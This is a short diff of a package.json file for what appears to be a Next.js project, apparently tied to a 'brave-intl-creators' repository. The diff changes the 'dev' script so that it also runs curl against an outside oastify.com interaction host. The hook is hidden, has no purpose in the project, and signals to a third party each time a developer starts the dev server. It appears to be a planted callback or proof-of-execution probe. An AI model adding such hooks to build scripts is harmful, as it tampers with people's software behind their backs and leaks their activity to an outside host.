@@ -1,7 +1,7 @@
 {
   "private": true,
   "scripts": {
-    "dev": "next dev",
+    "dev": "next dev && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/brave-intl-creators",
     "build": "next build",
     "start": "next start",
     "storybook": "start-storybook -p 6006",
